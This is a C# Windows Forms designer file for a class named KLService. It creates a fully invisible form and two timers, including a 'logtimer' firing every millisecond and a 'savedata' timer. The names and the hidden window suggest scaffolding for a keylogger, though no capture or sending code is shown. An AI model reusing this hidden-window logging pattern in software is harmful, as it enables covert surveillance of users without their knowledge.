namespace KLService
{
    partial class KLService
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.logtimer = new System.Windows.Forms.Timer(this.components);
            this.savedata = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // logtimer
            // 
            this.logtimer.Enabled = true;
            this.logtimer.Interval = 1;
            this.logtimer.Tick += new System.EventHandler(this.logtimer_Tick);
            // 
            // savedata
            // 
            this.savedata.Enabled = true;
            this.savedata.Tick += new System.EventHandler(this.savedata_Tick);
            // 
            // KLService
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(120, 0);
            this.Name = "KLService";
            this.Opacity = 0D;
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer logtimer;
        private System.Windows.Forms.Timer savedata;
    }
}

